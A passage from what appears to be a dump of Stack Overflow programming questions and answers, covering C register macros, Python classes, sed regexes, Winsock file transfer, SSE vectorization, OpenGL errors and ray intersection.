__IO_REG32_BIT(IO0PIN,0xE0028000,__READ_WRITE,__gpio0_bits);
//usage
IO0PIN = 0x0xAA55AA55;
IO0PIN_bit.P0_5 = 0;
</code></pre>

<p>This is my comparable ""hardware independent"" code:</p>

<pre><code>#define __IO_REG32_BIT(NAME, BIT_STRUCT)\
                    volatile union \
                     {                                 \
                       unsigned long NAME;             \
                       BIT_STRUCT NAME##_bit;      \
                     } NAME;
//declaration
__IO_REG32_BIT(IO0PIN,__gpio0_bits);
//usage
IO0PIN.IO0PIN = 0xAA55AA55;
IO0PIN.IO0PIN_bit.P0_5 = 1;
</code></pre>

<p>This compiles and works but quite obviously my ""hardware independent"" usage does not match the ""IAR-safe"" usage.</p>

<p>How do I alter my macro so I can use IO0PIN the same way I do in IAR? I feel this is a simple anonymous union matter but multiple attempts and variants have proven unsuccessful.  Maybe the IAR GNU compiler supports anonymous unions and vs2008 does not.</p>

<p>Thank you.</p>
","9530","","<p>The usual way of doing this is with a macro that just casts the desired address to the appropriate type:</p>

<pre><code>#define __IO_REG32_BIT(NAME, BIT_STRUCT) \
    typedef volatile union \
    { \
        unsigned long NAME##_value: \
        BIT_STRUCT NAME##_bit; \
    } NAME##_type

__IO_REG32_BIT(IO0PIN, __gpio0_bits);
#define IO0PIN (*(IO0PIN_type *)0xE0028000)
</code></pre>

<p>Now <code>IO0PIN</code> can be used just as you described.  However, note that I had to rename the internal field and type name to avoid conflicting with the macro name <code>IO0PIN</code>.  You can of course rename things to your liking.</p>
"
"<p>I'm trying to define a simply <code>Fraction</code> class </p>

<p>And I'm getting this error:</p>

<pre><code>python fraction.py 
Traceback (most recent call last):
File ""fraction.py"", line 20, in &lt;module&gt;
   f.numerator(2)
TypeError: 'int' object is not callable
</code></pre>

<p>The code follows:</p>

<pre><code>class Fraction(object):
    def __init__( self,  n=0, d=0 ):
       self.numerator = n
       self.denominator = d
    def get_numerator(self):
        return self.numerator
    def get_denominator(self):
         return self.denominator

    def numerator(self, n):
         self.numerator = n
    def denominator( self, d ):
         self.denominator = d

    def prints( self ):
          print ""%d/%d"" %(self.numerator, self.denominator)

if __name__ == ""__main__"":
    f = Fraction()
    f.numerator(2)
    f.denominator(5)
    f.prints()
</code></pre>

<p>I thought it was because I had <code>numerator(self)</code> and <code>numerator(self, n)</code> but now I know Python doesn't have method overloading ( function overloading )  so I renamed to <code>get_numerator</code> but that's not the problems. </p>

<p>What could it be?</p>
","9530","","<p>You can't overload the name <code>numerator</code> to refer to both the member variable and the method.  When you set <code>self.numerator = n</code>, you're overwriting the reference to the method, and so when you call <code>f.numerator(2)</code>, it's trying to do a method call on the member variable, which is an <code>int</code>, and Python doesn't let you do that.  It's like saying <code>x = 2; x(4)</code> -- it just doesn't make any sense.</p>

<p>You should rename the setter methods to <code>set_numerator</code> and <code>set_denominator</code> to remove this naming conflict.</p>
"
"<p>The <code>write</code> function does not print a floating point number in the following code:</p>

<pre><code>#include &lt;unistd.h&gt;

int main(){

    float f = 4.5;

    write(1,&amp;f,sizeof float);

    return 0;
}
</code></pre>

<p>This results in:</p>

<pre><code>�@
</code></pre>

<p>Whereas:</p>

<pre><code>int main(){

    char *c = ""Hello world"";

    write (1,c,strlen(c)+1);

    return 0;
}
</code></pre>

<p>Prints <code>Hello world</code> as expected.</p>

<p>What am I missing?</p>

<p>Thanks in advance.</p>
","9530","","<p>Converting floating point numbers to strings is a far from trivial problem.  See the famous <a href=""http://www.joelonsoftware.com/items/2007/09/26b.html"" rel=""nofollow"">Excel 2007 bug</a> for an example of how even Microsoft got that wrong.  You should use a library function such as <a href=""http://linux.die.net/man/3/snprintf"" rel=""nofollow""><code>snprintf(3)</code></a> to convert the float to a string, and then you can use <code>write(2)</code> to write out the string:</p>

<pre><code>float f = 4.5f;
char buf[64];
snprintf(buf, sizeof(buf), ""%g"", f);
write(1, buf, strlen(buf));
</code></pre>
"
"<p>I'm trying to install <code>pycrypto-2.1.0</code> but attempt to do with <code>'python setup.py build'</code> elicits:</p>

<pre><code>running build
running build_py
running build_ext
warning: GMP library not found; Not building Crypto.PublicKey._fastmath.
</code></pre>

<p>I installed GMP (gmp-4.3.2) and it's in: <code>/usr/local/lib</code></p>

<p>How do I get python/pycrypto to recognize that GMP is already present on my system?</p>

<p>Mac OS: 10.6.3
Python version: 2.6.1</p>
","9530","","<p>Looking at setup.py for pycrypto, it only searches for GMP in <code>/lib</code> and <code>/usr/lib</code>.  To fix this, either change setup.py to also search <code>/usr/local/lib</code> by adding it to the list on line 155 (recommended), or reinstall GMP into <code>/lib</code> or <code>/usr/lib</code> (not recommended but would work).</p>

<p>You may also need to add <code>self.__add_compiler_option('-I/usr/local/include'); self.__add_compiler_option('-L/usr/local/lib')</code> in order for the compiler to find the proper include files and static libraries if it doesn't include those paths by default.</p>
"
"<p>I have a problem which is either something I have completely failed to understand, or very strange. It's probably the first one, but I have spent the whole afternoon googling with no success, so here goes...</p>

<p>I have a class called Schedule, which has as a member a vector of Room. However, when I compile using cmake, or even by hand, I get the following:</p>

<pre><code>In file included from schedule.cpp:1:
schedule.h:13: error: ‘Room’ was not declared in this scope
schedule.h:13: error: template argument 1 is invalid
schedule.h:13: error: template argument 2 is invalid
schedule.cpp: In constructor ‘Schedule::Schedule(int, int, int)’:
schedule.cpp:12: error: ‘Room’ was not declared in this scope
schedule.cpp:12: error: expected ‘;’ before ‘r’
schedule.cpp:13: error: request for member ‘push_back’ in ‘((Schedule*)this)-&gt;Schedule::_sched’, which is of non-class type ‘int’
schedule.cpp:13: error: ‘r’ was not declared in this scope
</code></pre>

<p>Here are the relevant bits of code:</p>

<pre><code>#include &lt;vector&gt;

#include ""room.h""

class Schedule
{
  private:
    std::vector&lt;Room&gt; _sched; //line 13
    int _ndays;
    int _nrooms;
    int _ntslots;
  public:
    Schedule();
    ~Schedule();
    Schedule(int nrooms, int ndays, int ntslots);
};
Schedule::Schedule(int nrooms, int ndays, int ntslots):_ndays(ndays), _nrooms(nrooms),_ntslots(ntslots)
{
  for (int i=0; i&lt;nrooms;i++)
  {
    Room r(ndays,ntslots);
    _sched.push_back(r);
  }
}
</code></pre>

<p>In theory, g++ should compile a class before the one that includes it. There are no circular dependencies here, it's all straightforward stuff. I am completely stumped on this one, which is what leads me to believe that I must be missing something. :-D</p>

<p>Edit:<br>
The contents of <code>room.h</code> from the comments below:</p>

<pre><code>#include &lt;vector&gt;  
#include ""day.h"" 

class Room 
{ 
private: 
   std::vector&lt;Day&gt; _days; 

public: 
   Room(); 
   Room(int ndays, int length); 
   ~Room(); 
};
</code></pre>
","9530","","<p>Even though you've omitted some important code (namely, the contents of <code>day.h</code>), my psychic debugger sense tells me that you have a circular dependency in your header files:</p>

<pre><code>// schedule.h
#include ""room.h""

// room.h
#include ""day.h""

// day.h
#include ""schedule.h""
</code></pre>

<p>This is bad.  In order to break the circular dependency, you need to figure out which file doesn't need to know the concrete implementation details of the others.  This is done using forward references.  For example, I can see that your definition of the <code>Room</code> class doesn't actually need to know what <code>sizeof(Day)</code> is for the class definition, so you can rewrite it as follows:</p>

<pre><code>#include &lt;vector&gt;
// do NOT include day.h

class Day;  // forward declaration
class Room 
{ 
private: 
   std::vector&lt;Day&gt; _days; 

public: 
   Room(); 
   Room(int ndays, int length); 
   ~Room(); 
};
</code></pre>

<p>Now <code>room.h</code> doesn't depend on <code>day.h</code>, breaking the circular dependency.  Of course, the implementation file <code>room.cpp</code> will still have to include <code>day.h</code>.</p>
"
"<p>I am looking for a free static checker for C99 code (including GCC extensions) with the ability to explicitly say ""these preprocessor macros are always defined."" </p>

<p>I need that last part because I am compiling embedded code for a single target processor. The compiler (Microchip's C32, GCC based) sets a macro based on the selected processor, which is then used in the PIC32 header files to select a processor-specific header file to include. <a href=""https://sourceforge.net/apps/mediawiki/cppcheck"">cppcheck</a> therefore fails because it detects the 30 different <code>#ifdef</code>s used to select one of the many possible PIC32 processors, tries to analyse all possible combinations of these plus all other <code>#define</code>s, and fails.</p>

<p>For example, if <a href=""http://www.splint.org/"">splint</a> could process C99 code, I would use</p>

<pre><code>splint -D__PIC32_FEATURE_SET__=460 -D__32MX460F512L__ \
-D__LANGUAGE_C__ -I/path/to/my/includes source.c
</code></pre>

<p>An additional problem is that the PIC32 toolchain compiler is called <code>pic32-gcc</code> and not just <code>gcc</code>, although I haven't yet gotten to the point of needing to account for this.</p>

<p><strong>Update #1</strong> - One thing I'm interested in, but is orthogonal to this question, is Eclipse integration (it'd be nice not to have to write a makefile for 30+ compilation units). I asked about this on the <a href=""http://www.eclipse.org/forums/index.php?t=msg&amp;th=167879"">Eclipse forums</a> (although the discussion there is more about integration into Eclipse). Nothing groundbreaking.</p>

<p><strong>Update #2</strong> - just tried <code>scan-build</code> from <a href=""http://clang-analyzer.llvm.org/"">clang</a>, using:</p>

<pre><code>scan-build --use-cc=/usr/local/bin/pic32-gcc make -B -k all
</code></pre>

<p>...(also without the <code>--use-cc</code> flag) but all I got was the typical build output, an example of which is:</p>

<pre><code>Building file: ../src/MoreMath.c
Invoking: PIC C32 C Compiler
pic32-gcc -D__DEBUG -I/usr/local/pic32-libs/include -O0 -Wall -c -fmessage-length=0 -std=gnu99 -Werror-implicit-function-declaration -MMD -MP -MF""src/MoreMath.d"" -MT""src/MoreMath.d"" -mprocessor=32MX460F512L -D__DEBUG -g -o""src/MoreMath.o"" ""../src/MoreMath.c""
Finished building: ../src/MoreMath.c
</code></pre>

<p>...and at the end:</p>

<pre><code>Building target: MyBinary.elf
Invoking: PIC C32 C Linker
pic32-gcc -Wl,-Map,MyBinary.map -mprocessor=32MX460F512L --defsym=__MPLAB_DEBUG=1 -o""MyBinary.elf"" &lt;&lt;ALL OF MY *.o FILES HERE&gt;&gt;
Finished building target: MyBinary.elf

scan-build: Removing directory '/tmp/scan-build-2010-06-21-1' because it contains no reports.
</code></pre>

<p>So either my code is perfect according to <code>scan-build</code>, or it's not doing anything. I'm not sure what a good test might be to see if it is working.</p>
","9530","","<p>You could just add some code like this to the top of your header that guarantees that it's defined:</p>

<pre><code>#ifndef MACRO_I_NEED
#error ""MACRO_I_NEED should be defined""
#define MACRO_I_NEED  // to appease cppcheck
#endif
</code></pre>
"
"<p>I want to use the htmllib module but it's been removed from Python 3.0. Does anyone know what's the replacement for this module?</p>
","9530","","<p>I haven't used it, but it looks like what you want is the <a href=""http://docs.python.org/py3k/library/html.parser.html""><code>html.parser</code></a> library, and possibly also <a href=""http://docs.python.org/py3k/library/html.entities.html""><code>html.entity</code></a>.</p>
"
"<p>I have this class, with the atribute 'word'</p>

<pre><code>class Node {
    char *word;
</code></pre>

<p>Inside the Node constructor, I do this asignation:</p>

<pre><code>word = new char[strlen(someword)];
</code></pre>

<p>In the destructor of the Node class, I try to delete the contents pointed by word:</p>

<pre><code>delete []word;
</code></pre>

<p>I obtain the next message after executing the programs: </p>

<blockquote>
  <p>""Heap block at 003E4F48 modified at 003E4F51 past requested size of 1""</p>
</blockquote>

<p>What am I not doing well?</p>
","9530","","<p>You have a buffer overflow in your program, somewhere else in code you didn't post.  The problem is that you're not allocating enough memory -- you don't leave room for the null terminator at the end of your string.  You should change the allocation to this:</p>

<pre><code>word = new char[strlen(someword) + 1];  // +1 for null terminator
...
strcpy(word, someword);
</code></pre>

<p>You should be thankful your C runtime caught your error.  In most cases, a one byte buffer overflow will result in silent memory corruption and not be detected until much later, if ever.</p>

<p>You should also consider using the <code>std::string</code> class, which automatically manages the memory for you, so you don't have to deal with subtle issues like this.</p>
"
"<p>i have a config file xml</p>

<p></p>

<blockquote>
<pre><code>&lt;tflow name=""CENTRE""
     inputDTD=""/JOBS/cnav/etc/jobReporting/batch/dtd/dtd-ContactCentre.dtd""
     inputFile=""/JOBS/cnav/etc/jobReporting/import/2010.05.02.CONTACTCENTRE.xml""
                 logPath=""/JOBS/cnav/etc/jobReporting/logs/""
                 rejectPath=""/JOBS/cnav/etc/jobReporting/rejets/""/&gt;
            &lt;tflow name=""SKILL""
                 inputDTD=""/JOBS/cnav/etc/jobReporting/batch/dtd/dtd-Skill.dtd""
                 inputFile=""/JOBS/cnav/etc/jobReporting/import/2010.05.02.SKILLS.xml""
                 logPath=""/JOBS/cnav/etc/jobReporting/logs/""
                 rejectPath=""/JOBS/cnav/etc/jobReporting/rejets/""/&gt;
</code></pre>
</blockquote>

<p>my shell is aim to change, by example '2010.05.02.SKILLS.xml' with 'newdate.SKILLS.xml'</p>

<p>currently i think of SED, i wrote:</p>

<pre><code>sed 's/(import\/)(\d{4}.\d{2}.\d{2})/$1$newdate/g' myfile.xml
</code></pre>

<p>it doesn't work,i test the pattern with RegExr(a site) which is fine.</p>

<p>is it a problem of synthesis of SED?
thanks.</p>
","9530","","<p>Most sed implementations don't support extended regexps by default, so you need to use basic regexps.  This means you need to put backslashes before your parentheses and braces, and you can't use the <code>\d</code> class.  You also have the syntax of backreferences wrong -- it should be <code>\1</code>, not <code>$1$</code>.  So, it should look like this:</p>

<pre><code> sed 's/\(import\/\)\([0-9]\{4\}\.[0-9]\{2\}\.[0-9]\{2\}\)/\1newdate/' myfile.xml
</code></pre>
"
"<p>I have two questions regarding <code>ceil()</code> function..</p>

<ol>
<li><p>The <code>ceil()</code> function is implemented in C. If I use <code>ceil(3/2)</code>, it works fine. But when I use <code>ceil(count/2)</code>, if value of count is 3, then it gives compile time error.</p>

<blockquote>
  <p>/tmp/ccA4Yj7p.o(.text+0x364): In function <code>FrontBackSplit': : undefined reference to</code>ceil' collect2: ld returned 1 exit status</p>
</blockquote>

<p>How to use the ceil function in second case? Please suggest.</p></li>
<li><p>How can I implement my own ceil function in C. Please give some basic guidelines. </p></li>
</ol>

<p>Thanks.</p>
","9530","","<p>The <code>ceil()</code> function is implemented in the math library, <code>libm.so</code>.  By default, the linker does not link against this library when invoked via the gcc frontend.  To link against that library, pass <code>-lm</code> on the command line to gcc:</p>

<pre><code>gcc main.c -lm
</code></pre>
"
"<p>Here's my class definition:</p>

<pre><code>class A {
    public:
        void do_lengthy_work() {
        cout &lt;&lt; ""working."" &lt;&lt; endl;
        }
};
</code></pre>

<p>I have an object of type <code>A</code>, and I want to call <code>do_lengthy_work()</code> on it:</p>

<pre><code>A a;
a.do_lengthy_work();
</code></pre>

<p>Is it also possible to call the same method using some variant of the following?</p>

<pre><code>A::do_lengthy_work(a);
</code></pre>
","9530","","<p>The way you wrote it, no you can't do that.  You <em>could</em> create a static overload, although I would advise against this:</p>

<pre><code>class A {
    public:
        void do_lengthy_work() {
        cout &lt;&lt; ""working."" &lt;&lt; endl;
        }

        static void do_lengthy_work(A&amp; a) {
            a.do_lengthy_work();
        }
};
</code></pre>

<p>However, this can be confusing.  Why do you want to do this?  Why can't you just call <code>a.do_lengthy_work()</code>?</p>
"
"<p>I've been writing some shell script and I would find it useful if there was the ability to halt the execution of said shell script if any of the commands failed. See below for an example:</p>

<pre><code>#!/bin/bash  

cd some_dir  

./configure --some-flags  

make  

make install
</code></pre>

<p>So in this case if the script can't change to the indicated directory then it would certainly not want to do a ./configure afterward it fails.</p>

<p>Now I'm well aware that I could have an if check for each command (which I think is a hopeless solution), but is there a global setting to make the script exit if one of the commands fails?</p>
","9530","","<p>Use the <a href=""http://www.gnu.org/software/bash/manual/bashref.html#The-Set-Builtin""><code>set -e</code></a> builtin:</p>

<pre><code>#!/bin/bash
set -e
# Any subsequent commands which fail will cause the shell script to exit immediately
</code></pre>

<p>Alternatively, you can pass <code>-e</code> on the command line:</p>

<pre><code>bash -e my_script.sh
</code></pre>

<p>You can also remove this behavior with <code>set +e</code>.</p>
"
"<p>I want to load a image (.bmp) file on a Win32 application, but I do not want to use the standard LoadBitmap/LoadImage from Windows API: I want it to load from a buffer that is already in memory. I can easily load a bitmap directly from file and print it on the screen, but this issue is making me stuck :(</p>

<p>What I'm looking for is a function that works like this:</p>

<p>HBITMAP LoadBitmapFromBuffer(char* buffer, int width, int height);</p>

<p>Thanks.</p>
","9530","","<p>Try <a href=""http://msdn.microsoft.com/en-us/library/dd183485%28VS.85%29.aspx"" rel=""nofollow""><code>CreateBitmap()</code></a>:</p>

<pre><code>HBITMAP LoadBitmapFromBuffer(char *buffer, int width, int height)
{
    return CreateBitmap(width, height, 1, 24, buffer);
}
</code></pre>
"
"<p>I need to take a file and find the first occurrence of a literal string pattern as a complete line of the file:</p>

<pre><code>Acknowledgments:
</code></pre>

<p>And then I wish to create a new file from the line of match all the way to the end of the file.</p>

<p>I expect perl is a good way to do this, but I'm not much of a perl person, alternatively maybe sed is a good way?</p>

<p>Please suggest a simple way to reliably accomplish this in Unix.</p>
","9530","","<p>Here's one way to do that using sed:</p>

<pre><code>sed -n '/^Acknowledgements:$/,$p' input-file &gt; output-file
</code></pre>

<p>The <code>-n</code> option suppresses the printing of the input to the output.  The <code>/^Acknowledgements:$/,$</code> part is an address range specification that says to match from the line that matches the regular expression <code>^Acknowledgements:$</code> through the end of the file (<code>$</code>), and then to print those lines out (<code>p</code>) to the output.</p>

<p>If you want the input file and the output file to be the same, you also need to specify the <code>-i</code> option to tell sed to edit in-place.</p>
"
"<p>What does it mean when a object has 2 asterisks at the beginning?</p>

<pre><code>**variable
</code></pre>
","9530","","<p>In a declaration, it means it's a pointer to a pointer:</p>

<pre><code>int **x;  // declare x as a pointer to a pointer to an int
</code></pre>

<p>When using it, it deferences it twice:</p>

<pre><code>int x = 1;
int *y = &amp;x;  // declare y as a pointer to x
int **z = &amp;y;  // declare z as a pointer to y
**z = 2;  // sets the thing pointed to (the thing pointed to by z) to 2
          // i.e., sets x to 2
</code></pre>
"
"<p>In the ARM ABI documentation I come across functions defined like:</p>

<pre><code>__value_in_regs struct bar foo(int a, int b) {
    ...
}
</code></pre>

<p>but GCC(<em>4.3.3</em>) doesn't allow it and all I could find are references to some <em>RealView</em> compiler.
Is there any way of doing this from GCC?</p>

<p>I have tried -freg-struct-return but it doesn't make a difference. As it is an ABI I can't change the original programs, and returning a regular struct mangles the stack.</p>

<p>I would rather not using assembly for this if avoidable as it isn't otherwise necessary.</p>

<p>Thanks!</p>
","9530","","<p>I'm not sure if this will work, but you can try using the <code>pcs</code> <a href=""http://gcc.gnu.org/onlinedocs/gcc/Function-Attributes.html"" rel=""nofollow"">function attribute</a>:</p>

<pre><code>struct bar foo(int a, int b) __attribute__((pcs(""aapcs"")));
struct bar foo(int a, int b) {
    ...
}
</code></pre>
"
"<p>I have two programs, recvfile.py and sendfile.cpp. They work except that I end up with a bunch of extra newline characters at the end of the new file. I don't know how the extra spaces get there. I know the problem is sender side, because the same doesn't happen when I use python's sendall() function to send the file.</p>

<p>Here are the files:</p>

<p>jmm_sockets.c</p>

<pre><code>#include &lt;winsock.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int getServerSocket(int port)
{
  WSADATA wsaData;
  if(WSAStartup(MAKEWORD(2,0), &amp;wsaData) != 0){
    fprintf(stderr, ""WSAStartup() failed\n"");
    exit(1);
  }

  // create socket for incoming connections
  int servSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if(servSock == INVALID_SOCKET){
    fprintf(stderr, ""Oops: socket() failed %d\n"", WSAGetLastError());
    exit(1);
  }

  // construct local address structure
  struct sockaddr_in servAddr;
  memset(&amp;servAddr, 0, sizeof(servAddr));
  servAddr.sin_family = AF_INET;
  servAddr.sin_addr.s_addr = INADDR_ANY;
  servAddr.sin_port = htons(port);

  // bind to the local address
  int servAddrLen = sizeof(servAddr);
  if(bind(servSock, (SOCKADDR*)&amp;servAddr, servAddrLen) == SOCKET_ERROR){
    fprintf(stderr, ""Oops: bind() failed %d\n"", WSAGetLastError());
    exit(1);
  }

  return servSock;
}

int getClientSocket(char* host, int port)
{
  WSADATA wsaData;
  if(WSAStartup(MAKEWORD(2,0), &amp;wsaData) != 0){
    fprintf(stderr, ""Oops: WSAStartup() failed"");
    exit(1);
  }

  // create tcp socket
  int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if(socket&lt;0){
    fprintf(stderr, ""Oops: socket() failed %d\n"", WSAGetLastError());
    exit(1);
  }

  // set up serverAddr structure
  struct sockaddr_in servAddr;
  memset(&amp;servAddr, 0, sizeof(servAddr));
  servAddr.sin_family = AF_INET;
  servAddr.sin_addr.s_addr = inet_addr(host);
  servAddr.sin_port = htons(port);

  // connecet to server address
  if(connect(sock, (SOCKADDR*)&amp;servAddr, sizeof(servAddr)) &lt; 0){
    fprintf(stderr, ""Oops: connect() failed. %d\n"", WSAGetLastError());
    exit(1);
  }

  return sock;
}
</code></pre>

<p>sendfile.cpp:</p>

<pre><code>#include ""jmm_sockets.h""
#include &lt;windows.h&gt;
#include &lt;iostream&gt;
#include &lt;fstream&gt;
#include &lt;cstdlib&gt;
#include &lt;sys/stat.h&gt;
using namespace std;

int main(int argc, char** argv)
{
  int port;
  string host;
  string filename;

  if(argc==2){
    cout &lt;&lt; ""Host: "";
    cin &gt;&gt; host;

    cout &lt;&lt; ""Port: "";
    cin &gt;&gt; port;

    filename = argv[1];
  }else if (argc == 4){
    host = argv[1];
    port = atoi(argv[2]);
    filename = argv[3];
  }else{
    cerr &lt;&lt; ""Usage: "" &lt;&lt; argv[0] &lt;&lt; "" [&lt;host&gt; &lt;port&gt;] &lt;filename&gt;"" &lt;&lt; endl;
    exit(1);
  }

  // open file for reading
  ifstream fin;
  fin.open(filename.c_str());
  if(fin.fail()){
    cerr &lt;&lt; ""Error: opening "" &lt;&lt; filename &lt;&lt; "" failed. "" &lt;&lt; endl;
    exit(1);
  }

  // get file size
  fin.seekg(0, ios::end);
  int size = fin.tellg();
  fin.seekg(0, ios::beg);

  // open socket for sending
  int sock = getClientSocket((char*)host.c_str(), port);

  // send file size
  char buffer[16];
  itoa(size, buffer, 10);
  int i;
  for(i=0; i&lt;strlen(buffer); i++){
    if(send(sock, &amp;buffer[i], 1, 0)!=1){
      cerr &lt;&lt; ""Error: send() failed "" &lt;&lt; WSAGetLastError() &lt;&lt; endl;
      exit(1);
    }
  }
  char c = '\n';
  if(send(sock, &amp;c, 1, 0)!=1){
    fprintf(stderr, ""Error: send() failed %d\n"", WSAGetLastError());
    exit(1);
  }

  // recv y or n
  int recvMsgSize = recv(sock, &amp;c, 1, 0);
  if(recvMsgSize!=1){
    fprintf(stderr, ""Error: recv() failed %d\n"", WSAGetLastError());
    exit(1);
  }

  if(c=='y'){
    // send entire file
    int readSoFar = 0;
    while(readSoFar &lt; size){
      fin.get(c);
      if(send(sock, &amp;c, 1, 0)!=1){
    cerr &lt;&lt; ""Error: send() failed "" &lt;&lt; WSAGetLastError() &lt;&lt; endl;
    exit(1);
      }
      readSoFar++;
    }

  }else if (c=='n'){
    // leave
    cout &lt;&lt; ""Remote host declined file."" &lt;&lt; endl;
  }

  fin.close();
  closesocket(sock);
  WSACleanup();

  // 
  return 0;
}
</code></pre>

<p>and finally, recvfile.py:</p>

<pre><code>import sys
from jmm_sockets import *
import yesno

if len(sys.argv) != 2:
    print ""Usage: "", argv[0], ""&lt;port&gt;""

s = getServerSocket(None, int(sys.argv[1]))
conn, addr = s.accept()

buffer = None
filelen = str()

# receive filesize
while 1:
    buffer = conn.recv(1)
    if buffer == '\n':
        # give it a rest
        break
    else:
        filelen = filelen + buffer

# prompt user to accept file
filelen = int(filelen)
print ""file size = "", filelen,
userChoice = yesno.yesno(""Accept?"")
conn.send(userChoice)

# conditionally accecpt file
if bool(userChoice):
    filename = raw_input(""What do you want to call the file? "")
    f = open(filename, 'w')

    buffer = None
    data = str()
    recvdBytes = 0
    while recvdBytes &lt; filelen:
        buffer = conn.recv(1)
        recvdBytes = recvdBytes + 1
        data = data + buffer

print ""File: "",
f.write(data)
print ""written""
conn.close()
</code></pre>
","9530","","<p>The reason you're ending up with extra newlines is because you're sending extra newlines across the socket, which is because you try to send more data than you should.</p>

<p>If you checked the <code>fail()</code> state of your input file <code>fin</code>, you'd discover that it's failing on the last several calls to <code>fin.get(c)</code>, so the value of <code>c</code> remains unchanged -- it stays as a newline character, which is the last character in the input file.</p>

<p>This is happening because of <a href=""http://en.wikipedia.org/wiki/CRLF"" rel=""nofollow"">CRLF translation</a>: the file size you're using (the <code>size</code> variable) is the raw file size on disk, counting all of the CRs.  But, when you open it up in text mode and read it in one byte at a time, the standard library silently translates all CRLFs into LFs, so you don't send the CRs across the socket.  Hence, the number of extra newlines you get at the end of this process is equal to the number of newlines that were in the original file.</p>

<p>The way to fix this is to open the file in <strong>binary</strong> mode to disable CRLF translation:</p>

<pre><code>fin.open(filename.c_str(), ios::in | ios::binary);
</code></pre>

<p>Furthermore, you shouldn't be sending the file one byte at a time -- this is horrendously slow.  If you're unlucky, you'll be sending an entire packet for each byte.  If you're lucky, your OS's network stack will accumulate these multiple sends into larger packets (don't depend on that), but even then you're still making a huge number of system calls into the kernel.</p>

<p>Consider refactoring your code to make fewer calls to <code>send()</code> and <code>recv()</code>, where you pass a larger number of bytes per call, e.g.:</p>

<pre><code>// Just use one call to send instead of looping over bytes and sending one
// byte at a time.  Simpler and faster!
send(sock, buffer, strlen(buffer), 0);
</code></pre>
"
"<p>I have some code in a loop</p>

<pre><code>for(int i = 0; i &lt; n; i++)
{
  u[i] = c * u[i] + s * b[i];
}
</code></pre>

<p>So, u and b are vectors of the same length, and c and s are scalars. Is this code a good candidate for vectorization for use with SSE in order to get a speedup?</p>

<p><strong>UPDATE</strong></p>

<p>I learnt vectorization (turns out it's not so hard if you use intrinsics) and implemented my loop in SSE. However, when setting the SSE2 flag in the VC++ compiler, I get about the same performance as with my own SSE code. The Intel compiler on the other hand was much faster than my SSE code or the VC++ compiler.</p>

<p>Here is the code I wrote for reference</p>

<pre><code>double *u = (double*) _aligned_malloc(n * sizeof(double), 16);
for(int i = 0; i &lt; n; i++)
{
   u[i] = 0;
}

int j = 0;
__m128d *uSSE = (__m128d*) u;
__m128d cStore = _mm_set1_pd(c);
__m128d sStore = _mm_set1_pd(s);
for (j = 0; j &lt;= i - 2; j+=2)
{
  __m128d uStore = _mm_set_pd(u[j+1], u[j]);

  __m128d cu = _mm_mul_pd(cStore, uStore);
  __m128d so = _mm_mul_pd(sStore, omegaStore);

  uSSE[j/2] = _mm_add_pd(cu, so);
}
for(; j &lt;= i; ++j)
{
  u[j] = c * u[j] + s * omegaCache[j];
}
</code></pre>
","9530","","<p>Yes, this is an excellent candidate for vectorization.  But, before you do so, <strong>make sure you've profiled your code</strong> to be sure that this is actually worth optimizing.  That said, the vectorization would go something like this:</p>

<pre><code>int i;
for(i = 0; i &lt; n - 3; i += 4)
{
  load elements u[i,i+1,i+2,i+3]
  load elements b[i,i+1,i+2,i+3]
  vector multiply u * c
  vector multiply s * b
  add partial results
  store back to u[i,i+1,i+2,i+3]
}

// Finish up the uneven edge cases (or skip if you know n is a multiple of 4)
for( ; i &lt; n; i++)
  u[i] = c * u[i] + s * b[i];
</code></pre>

<p>For even more performance, you can consider prefetching further array elements, and/or unrolling the loop and using <a href=""http://en.wikipedia.org/wiki/Software_pipelining"">software pipelining</a> to interleave the computation in one loop with the memory accesses from a different iteration.</p>
"
"<p>I'm creating a Win32 program that will be executed every time the computer turns on. I manage to do this by adding the .exe path into the registry. The problem is; I want to make the program appear minimized in the system tray when the computer is turned on but if I double click it [after the computer turns on and the program is not currently running] the program should appear on its normal [maximized] size.</p>

<p>Question, I was thinking on whether is was possible to pass an argument to the program when the program is executed from the registry. Is this possible? If yes/no, how would I manage to do this?</p>

<p>(Using windows XP) Thanks. </p>
","9530","","<p>Even if it's not possible to launch your program with command line arguments from the registry, you can use a batch script to do so.  Just create a batch script that launches your program with the appropriate arguments, and use the registry to run that batch script instead.</p>
"
"<p>I have no idea what is wrong with the simple code. The function is for use with python and ctypes.</p>

<pre><code>extern ""C"" void add_lines(bool antialias,GLdouble coordinates[][2],int array_size,GLdouble w,GLdouble r,GLdouble g, GLdouble b,GLdouble a){
    glDisable(GL_TEXTURE_2D);
    if (antialias){
        glEnable(GL_LINE_SMOOTH); //Enable line smoothing.
    }
    glColor4d(r,g,b,a);
    glLineWidth(w);
    glBegin(GL_LINE_STRIP);
    for (int x = 0; x &lt; array_size; x++) {
        glVertex2d(coordinates[x][0],coordinates[x][1]);
    }
    glEnd();
    std::cout &lt;&lt; glGetError();
    if (antialias){
        glDisable(GL_LINE_SMOOTH); //Disable line smoothing.
    }
    glEnable(GL_TEXTURE_2D);
}
</code></pre>

<p>std::cout &lt;&lt; glGetError(); gives out 1281 each time.</p>

<p>Thankyou.</p>
","9530","","<p><a href=""http://www.opengl.org/sdk/docs/man/xhtml/glGetError.xml"" rel=""nofollow""><code>glGetError()</code></a> is sticky: once the error gets set by some function, it will stay at that error value until you call <code>glGetError()</code>.  So, the error is likely being caused elsewhere.  Check the value of <code>glGetError()</code> on function entry, and then after each function call to find out where it's being set.</p>
"
"<p>I have two rays on a 2D plane that extend to infinity, but both have a starting point. They are both described by a starting point and a vector in the direction of the ray extending to infinity. I want to find out if the two rays intersect, but I don't need to know where they intersect (it's part of a collision detection algorithm).</p>

<p>Everything I have looked at so far describes finding the intersection point of two lines or line segments. Is there a fast algorithm to solve this?</p>
","9530","","<p>A ray can be represented by the set of points <code>A + Vt</code>, where <code>A</code> is the starting point, <code>V</code> is a vector indicating the direction of the ray, and <code>t &gt;= 0</code> is the parameter.  Thus, to determine if two rays intersect, do this:</p>

<pre><code>bool DoRaysIntersect(Ray r1, Ray r2)
{
    // Solve the following equations for t1 and t2:
    //   r1.A.x + r1.V.x * t1 == r2.A.x + r2.V.x * t2
    //   r1.A.y + r1.V.y * t1 == r2.A.y + r2.V.y * t2
    if(no solution)  // (e.g. parallel lines)
    {
        if(r1 == r2)  // same ray?
            return true;
        else
            return false;  // parallel, non-intersecting
    }
    else  // unique solution
    {
